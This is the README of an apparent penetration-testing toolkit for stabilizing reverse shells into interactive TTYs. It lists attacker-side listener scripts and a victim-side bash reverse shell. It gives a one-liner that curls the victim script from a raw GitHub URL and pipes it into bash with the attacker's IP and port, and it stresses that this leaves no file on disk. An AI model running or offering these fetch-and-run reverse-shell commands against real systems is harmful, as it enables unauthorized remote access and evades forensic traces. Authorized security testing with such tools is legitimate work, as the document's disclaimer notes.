
# 🚀 TTY Shell Stabilizer Toolkit
A collection of scripts designed to automate the transition from a basic shell to a fully interactive TTY.
## 📂 Scripts

| Script | Role | Method |
|---|---|---|
| python_tty.sh | Attacker | Interactive listener using Python pty. |
| bash_tty.sh | Attacker | Interactive listener using script command. |
| victim.sh | Victim | Bash-based reverse shell. |

------------------------------
## 🛠 Usage Instructions
To use these scripts, follow the parameter formats below:
## 1. Attacker Side (Listeners)
Run the script followed by the desired port. If you do not specify a port, the script will show you the usage guide.
Python Version:

./python_tty.sh <port>

Bash Version:

./bash_tty.sh <port>

------------------------------
## 2. Victim Side (Connection)
On the target machine, provide both the attacker's IP and the listening port.

./victim.sh <attacker_ip> <port>

------------------------------
## 💡 Quick Tips## Execution via Remote Pipe
If you cannot upload the script to the target machine, you can fetch it directly from this repository and execute it in memory without leaving a file on disk:

curl -s https://raw.githubusercontent.com/x86david/kali_interactive_tty/refs/heads/master/victim.sh | bash -s -- <attacker_ip> <port>

## ⚠️ Recovery
If the session ends and your terminal stops displaying your typing, type reset and press Enter to restore your local environment.
------------------------------
Disclaimer: For authorized security testing and administrative purposes only. !!!!!!!
------------------------------
